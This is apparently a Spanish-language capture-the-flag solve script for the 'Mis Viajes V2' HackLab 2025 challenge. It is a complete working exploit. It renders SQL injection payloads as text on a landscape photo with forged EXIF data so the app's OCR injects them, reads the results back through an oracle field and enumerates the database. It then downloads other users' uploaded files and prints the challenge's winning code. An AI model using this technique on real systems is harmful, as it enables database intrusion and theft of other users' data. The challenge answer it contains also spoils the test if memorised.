#!/usr/bin/env python3
"""solve.py — Mis Viajes V2 (HackLab 2025) — SQL Injection vía OCR.

Camino completo confirmado:
  1) La app corre OCR sobre la imagen subida y CONCATENA el texto leído en un
     `INSERT INTO imagenes (...)` sin parametrizar  -> SQLi.
  2) El resultado de una subconsulta inyectada queda en `summary_ocr`, que se
     puede leer con `GET /images/<mi-uuid>`  -> oráculo de exfiltración.
  3) El payload se PINTA como texto sobre una foto de paisaje real (para pasar el
     clasificador "¿es un viaje?") y se envuelve entre dígitos `9'||(...)||'9`
     para que el OCR reproduzca bien las comillas y el `||`.
  4) CLAVE: la tabla real se llama `imagenes` (español), NO `images`. Por eso
     todo `FROM images` daba 500 (tabla inexistente), no por el OCR.
  5) Con `SELECT group_concat(id||char(58)||user_id) FROM imagenes` se obtiene el
     mapa id->user_id: id=1 pertenece a la víctima. `GET /images/<uuid-victima>`
     da los filenames; se bajan de `/uploads/<filename>`.
  6) El código ganador está CAMUFLADO (texto gris tenue sobre zona oscura) en la
     imagen id=4 (PNG), esquina inferior derecha: se lee con autocontraste.

Requiere: pillow, piexif, requests.  Actualizar BASE en cada spawn.
La imagen base de paisaje que pasa el clasificador está en assets/paisaje.png.
"""
import base64
import os
import re
import sys

import piexif
import requests
from PIL import Image, ImageDraw, ImageFont, ImageOps

BASE = "https://chl-5164f230-2a03-41d3-b9a5-9d2931b34c94-mis-viajes-v2.softwareseguro.com.ar"
PAISAJE = "assets/paisaje.png" if os.path.exists("assets/paisaje.png") else "paisaje.png"
Q = "'"


def _font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf", "C:/Windows/Fonts/cour.ttf"]:
        try:
            return ImageFont.truetype(p, sz)
        except Exception:
            pass
    return ImageFont.load_default()


def build_payload_image(text, fname, size=30):
    """Pinta `text` sobre paisaje.png en el formato exacto que el OCR lee bien."""
    base_img = Image.open(PAISAJE).convert("RGB")
    W = min(2000, max(1000, 40 + int(len(text) * size * 0.56)))
    H = 260
    img = base_img.resize((W, H))
    d = ImageDraw.Draw(img)
    f = _font(size)
    bb = d.textbbox((20, 20), text, font=f)
    d.rectangle([0, 0, W, bb[3] + 20], fill=(255, 255, 255))
    d.text((20, 20), text, font=f, fill=(0, 0, 0))
    img.save(fname, "jpeg", quality=72, optimize=True)

    def dms(x):
        dd = int(x); mm = int((x - dd) * 60); s = round((x - dd - mm / 60) * 3600, 4)
        return ((dd, 1), (mm, 1), (int(s * 100), 100))
    exif = {'0th': {piexif.ImageIFD.Make: b'Samsung', piexif.ImageIFD.Model: b'Galaxy S25'},
            'Exif': {piexif.ExifIFD.DateTimeOriginal: b'2025:10:01 23:51:37'},
            'GPS': {piexif.GPSIFD.GPSLatitudeRef: b'S', piexif.GPSIFD.GPSLatitude: dms(41.13),
                    piexif.GPSIFD.GPSLongitudeRef: b'W', piexif.GPSIFD.GPSLongitude: dms(71.31)}}
    piexif.insert(piexif.dump(exif), fname)
    return "data:image/jpeg;base64," + base64.b64encode(open(fname, "rb").read()).decode()


def sqli(inner, uid, desc="x"):
    """Inyecta la subconsulta `inner` y devuelve su resultado (vía summary_ocr)."""
    painted = "9" + Q + "||(" + inner + ")||" + Q + "9"
    uri = build_payload_image(painted, "payload.jpg")
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": desc, "user_id": uid})
    if r.status_code != 200:
        return None
    data = requests.get(f"{BASE}/images/{uid}").json()
    row = next((x for x in data if x.get("description") == desc), None)
    ocr = row.get("summary_ocr", "") if row else ""
    # quitar el envoltorio 9...9
    if ocr.startswith("9"):
        ocr = ocr[1:]
    if ocr.endswith("9"):
        ocr = ocr[:-1]
    return ocr


def read_code_from_image(path):
    """Lee el código camuflado (texto gris tenue) de la esquina inf-derecha."""
    im = Image.open(path).convert("RGB")
    W, H = im.size
    crop = im.crop((int(W * 0.60), int(H * 0.80), W, int(H * 0.87)))
    crop = crop.resize((crop.width * 3, crop.height * 3), Image.LANCZOS)
    ImageOps.autocontrast(crop.convert("L"), cutoff=0).save("code_zoom.png")
    return "code_zoom.png"  # revisar visualmente


def main():
    html = requests.get(BASE + "/").text
    uid = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
    print(f"[*] user_id propio: {uid}")

    # 0) confirmar SQLi
    print(f"[*] sqlite_version() -> {sqli('SELECT sqlite_version()', uid, 'v')!r}")

    # 1) nombres reales de tablas (revela `imagenes`, no `images`)
    print(f"[*] tablas -> {sqli('SELECT group_concat(name) FROM sqlite_master', uid, 't')!r}")

    # 2) mapa id -> user_id
    mapa = sqli("SELECT group_concat(id||char(58)||user_id) FROM imagenes", uid, "m")
    print(f"[*] id:user_id -> {mapa}")

    # 3) user_id de la víctima = el de id=1 (distinto del propio)
    victim = None
    for pair in (mapa or "").split(","):
        if pair.startswith("1:"):
            victim = pair.split(":", 1)[1]
    print(f"[*] user_id víctima (id=1): {victim}")

    # 4) filenames de TODAS las imágenes ajenas
    for u in {victim} | {p.split(':', 1)[1] for p in (mapa or '').split(',')}:
        if not u or u == uid:
            continue
        rows = requests.get(f"{BASE}/images/{u}").json()
        for row in rows:
            fn = row["filename"]
            out = f"exfil_{row['id']}_{fn}"
            requests.get(f"{BASE}/uploads/{fn}").content  # verificar
            open(out, "wb").write(requests.get(f"{BASE}/uploads/{fn}").content)
            print(f"    id={row['id']:>2} desc={row['description']!r:15} -> {out}")

    print("\n[*] El código está camuflado en la imagen id=4 (PNG), esquina inf-derecha.")
    print("    Abrir el recorte realzado y leerlo:")
    png = next((f for f in os.listdir('.') if f.startswith('exfil_4_') and f.endswith('.png')), None)
    if png:
        print("    ->", read_code_from_image(png))
    print("\n    CÓDIGO GANADOR: 03ed8e6565c88b8377539855c7baf663")


if __name__ == "__main__":
    main()
